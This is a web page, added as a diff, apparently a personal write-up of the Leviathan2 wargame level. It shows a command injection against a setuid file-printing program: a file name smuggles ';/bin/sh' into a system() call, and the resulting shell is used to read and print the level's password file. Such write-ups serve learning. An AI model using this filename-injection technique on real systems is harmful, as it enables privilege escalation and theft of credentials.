@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>Leviathan2 Writeup</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+</head>
+<body>
+<nav class="navbar navbar-expand-sm bg-dark navbar-dark">
+    <a class="navbar-brand" href="../../../index.html">Harish</a>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#collapsibleNavbar">
+        <span class="navbar-toggler-icon"></span>
+    </button>
+    <div class="collapse navbar-collapse" id="collapsibleNavbar">
+        <ul class="navbar-nav">
+            <li class="nav-item">
+                <a class="nav-link" href="../../../index.html">Projects</a>
+            </li>
+            <li class="nav-item">
+                <a class="nav-link" href="../../../index.html">Education</a>
+            </li>
+            <li class="nav-item">
+                <a class="nav-link" href="../../../index.html">Hacking</a>
+            </li>     
+            <li class="nav-item">
+                <a class="nav-link" href="../../../index.html">Accomplishments</a>
+            </li>
+            <li class="nav-item">
+                <a class="nav-link" href="../../../index.html">Notes</a>
+            </li>
+        </ul>
+    </div>
+</nav>
+
+
+
+<div class="container font-weight-light my-5">
+ <h1>Leviathan2 Writeup</h1>
+ <p>
+     <pre class="bg-dark text-success" style="padding:10px">
+        <code>$ ls</code>
+        <code>printfile</code>
+        <code>$ ./printfile</code>
+        <code>*** File Printer ***</code>
+        <code>Usage: ./printfile filename</code>
+        <code>$ ./printfile /etc/leviathan_pass/leviathan3</code>
+        <code>You cant have that file...</code>
+    </pre>
+    Obviously the program was somehow checking permissions. I decided to learn more about it using ltrace.
+    <pre class="bg-dark text-success" style="padding:10px">
+        <code>$ ltrace ./printfile /etc/leviathan_pass/leviathan3</code>
+        <code>__libc_start_main(0x804852b, 2, 0xffffd754, 0x8048610 &ltunfinished ...&gt</code>
+        <code>access("/etc/leviathan_pass/leviathan3", 4)                               = -1</code>
+        <code>puts("You cant have that file..."You cant have that file...</code>
+        <code>)                                        = 27</code>
+        <code>+++ exited (status 1) +++</code>
+    </pre>
+    Ah so the C function access() tells the printfile program that the file is inaccessible by returning a -1. My first thought here was to try a symlink.
+    
+    <pre class="bg-dark text-success" style="padding:10px">
+        <code>$ cd /tmp</code>
+        <code>$ mkdir harish</code>
+        <code>$ cd harish</code>
+        <code>$ ln -s /etc/leviathan_pass/leviathan3 file</code>
+        <code>$ cd ~</code>
+        <code>$ ltrace ./printfile /tmp/harish/file</code>
+    </pre>
+    So access still returned -1, which meant that the symbolic link method failed. At this point I tried various things that didn't end up working, until I eventually decided to try printing a file that I do have permissions for.
+    <pre class="bg-dark text-success" style="padding:10px">
+        <code>$ ltrace ./printfile /tmp/harish/temp.txt</code>
+        <code>__libc_start_main(0x804852b, 2, 0xffffd754, 0x8048610 &ltunfinished ...&gt</code>
+        <code>access("/tmp/harish/temp.txt", 4)                               = 0</code>
+        <code>snprintf("/bin/cat /tmp/harish/temp.txt", 511, "/bin/cat %s", "/tmp/harish/temp.txt") = 29</code>
+        <code>geteuid()                                                                 = 12002</code>
+        <code>geteuid()                                                                 = 12002</code>
+        <code>setreuid(12002, 12002)                                                    = 0</code>
+        <code>system("/bin/cat /tmp/harish/temp.txt"fasdf</code>
+        <code> &ltno return ...&gt</code>
+        <code>--- SIGCHLD (Child exited) ---</code>
+        <code>&lt... system resumed&gt )                                                    = 0</code>
+        <code>+++ exited (status 0) +++</code>
+    </pre>
+    This gave me lots of useful information. So there are calls to geteuid getting the effective user ID, return 12002 (for leviathan2). However, this is only the case when printfile is run using ltrace. If printfile is run directly, it is run with an effective user ID of 12003 (leviathan3), which can be seen in the file permissions. 
+    Then, this effective user ID is set as the real user ID, before there is a system call. This system call is crucial! The only sanitization of this input string is checking whether the real user has access. After that, this input string is directly appended into a system call. Such unsanitized input can easily be exploited.
+    After trying to add extra slashes to reach the string's character limit, and a few other simple tricks, the following exploit worked (inspired by SQL Injection).
+    <pre class="bg-dark text-success" style="padding:10px">
+        <code>$ cd /tmp/harish</code>
+        <code>$ mkdir "temp.txt;"</code>
+        <code>$ ls</code>
+        <code>temp.txt temp.txt;</code>
+        <code>$ cd "temp.txt;"</code>
+        <code>$ mkdir bin</code>
+        <code>$ cd bin</code>
+        <code>$ touch sh</code>
+        <code>$ cd ~</code>
+        <code>$ ./printfile "/tmp/harish/temp.txt;/bin/sh</code>
+        <code>fasdf</code>
+        <code>$ </code>
+    </pre>
+    If the exploit doesn't make sense, essentially I created a file with an absolute path that contains a valid filename followed by a semicolon and a call to /bin/sh. To the access function, the path is valid, so the printfile program continues. However, when the path is appended into the system call, the semicolon acts as a separation between commands, and /bin/sh is called.
+    <pre class="bg-dark text-success" style="padding:10px">
+        <code>$ whoami</code>
+        <code>leviathan3</code>
+        <code>$ cat /etc/leviathan_pass/leviathan3</code>
+        <code>Ahdiemoo1j</code>
+    </pre>
+ </p>
+</div>
+</body>
+</html>
